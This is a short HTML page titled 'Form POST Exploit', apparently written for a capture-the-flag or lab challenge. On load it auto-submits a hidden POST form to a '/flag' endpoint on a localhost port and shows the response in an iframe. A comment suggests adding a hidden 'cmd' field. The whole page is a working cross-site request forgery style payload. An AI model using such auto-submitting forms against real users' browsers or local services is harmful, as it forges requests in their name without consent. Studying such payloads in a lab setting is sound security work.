<!DOCTYPE html>
<html>
<head>
    <title>Form POST Exploit</title>
    <style>
        body { font-family: monospace; padding: 20px; }
        iframe { width: 100%; height: 300px; border: 2px solid blue; }
    </style>
</head>
<body>
    <h2>Triggering POST Request...</h2>
    
    <!-- Using an iframe as the target for the form so we can capture or render the response -->
    <iframe name="resultFrame" id="resultFrame"></iframe>

    <form id="exploitForm" action="http://127.0.0.1:31326/flag" method="POST" target="resultFrame">
        <!-- Add any potential parameters if needed, e.g., <input type="hidden" name="cmd" value="test"> -->
    </form>

    <script>
        // Automatically submit the form upon loading
        setTimeout(() => {
            document.getElementById('exploitForm').submit();
        }, 500);
    </script>
</body>
</html>
